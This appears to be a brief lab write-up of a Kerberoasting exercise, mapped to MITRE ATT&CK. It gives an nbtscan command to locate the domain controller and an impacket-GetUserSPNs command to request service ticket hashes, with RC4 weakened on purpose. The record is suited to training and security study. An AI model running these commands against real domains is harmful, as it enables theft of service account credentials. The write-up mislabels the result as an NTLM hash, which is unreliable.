# 01 - Kerberosating

**MITRE ATT&CK:** T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting \
  - T1018 - Remote System Discovery
**Status:** Complete
---

## Objective
Use NBTscan to find the DC and continue the attack chain. Use Impacket to get user SPNs, providing elevated access to the domain.

---

## Environment / Prerequisites
**Attacker:** Kali
**Target:** svc_sql
**Starting access:** jcyber username and password
**Lab weakening required:** Enable RC4 Encryption for Kerberos

---

## Attack Execution
1. Perform an NBTscan to find the IP address of the DC
   - ```nbtscan 10.10.10.0/24```
   - <img width="169" height="52" alt="Kali_DC" src="https://github.com/user-attachments/assets/cc1809e9-1514-424f-b77e-21fa2a4035b2" />


2. Use Impacket to get a NTLM hash
   - ```impacket-GetUserSPNs lab.local/jcyber -dc-ip 10.10.10.4 -request```
   - <img width="441" height="221" alt="Kali_Kerberoast" src="https://github.com/user-attachments/assets/6ddaf1d8-c4a1-4717-8475-68bf4a086e47" />

